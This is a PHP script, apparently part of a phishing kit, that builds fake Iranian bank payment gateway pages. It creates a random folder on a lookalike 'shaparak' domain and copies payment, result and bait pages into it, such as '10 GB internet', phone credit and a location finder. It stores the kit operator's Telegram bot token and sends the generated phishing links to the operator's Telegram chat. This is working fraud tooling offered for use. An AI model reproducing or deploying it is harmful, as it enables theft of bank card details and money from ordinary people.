<?php
    $urlesite = "https://bmq-shaparak.ml"; // faghat inja linke sitet ro wared kon dige be hichi dast nazan. crated by @JavidH373
	$tokeshon = $_POST['token'];
	$idishon = $_POST['id'];
	$A=rand(1000,1000000); 
	$groupid = '$groupid';
	$token = '$token';
	
    	mkdir($A);
        $FileName = "$A/index.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "
<?php
copy('../behpardakht/payment.php', 'index.php');
copy('../behpardakht/result.php', 'result.php');
copy('../behpardakht/javidh373.php', 'javidh373.php');
copy('../dostyabi.php', 'dostyabi.php');
copy('../dahgigcell.php', 'dahgigcell.php');
copy('../sharj.php', 'sharj.php');
copy('../sighe.php', 'sighe.php');
copy('../makan.php', 'makan.php');
?>
<center><P>کسکشه عزیز درگاهت کامله فقط یه رفرش به صفحه بده بالا میاد درگاهت</p></center>
<?php
?>
");
       

 $FileName = "$A/token.php";
$FileHandle = fopen($FileName, 'w') or die("can't open file");
fwrite($FileHandle, "

<?php

$token = '$tokeshon';

$groupid = $idishon;

?>

");
	
		echo "<div id=stl>
<center>
درگاه شما با موفقیت ساخته شد
</br> 	 
لینک درگاهت فرستاده شد به رباتت برو بگیرش
</br>

</br>
<h5>Coded By @JavidH373</h5>
</div>"; 
$textmsg = "Dargahe Shoma Sakhte Shod! ‍ linke dargah: $urlesite/$A/index.php ‌‌‌‌‌ ‌‌‌‌‌ ❌❌❌‌ ‌‌‌‌‌ ‌‌‌‌‌ dostyabi: $urlesite/$A/dostyabi.php  ‌‌‌‌‌ ‌‌‌‌‌ ❌❌❌‌ ‌‌‌‌‌ ‌‌‌‌‌ 10gig net: $urlesite/$A/dahgigcell.php  ‌‌‌‌‌ ‌‌‌‌‌ ❌❌❌‌ ‌‌‌‌‌ ‌‌‌‌‌ sharjStar: $urlesite/$A/sharj.php ‌‌‌‌‌ ‌‌‌‌‌ ❌❌❌‌ ‌‌‌‌‌ ‌‌‌‌‌ sigheyabi: $urlesite/$A/sighe.php ‌‌‌‌‌ ‌‌‌‌‌ 🔆🔆🔆‌ ‌‌‌‌‌ ‌‌‌‌‌ makanyab: $urlesite/$A/makan.php Created By @JavidH373"; 
    $groupid = $idishon;     
    $ok =  file_get_contents("https://api.telegram.org/bot$tokeshon/SendMessage?chat_id=".$groupid."&text=".$textmsg);	
	
?>
<style>
#stl{
color:black;
font-size:50px;
background: linear-gradient(253.52deg, #84FC6A 8.92%, #48D6F2 96.59%);
border-radius:20px;

}
h5{
color:red;
}
</style>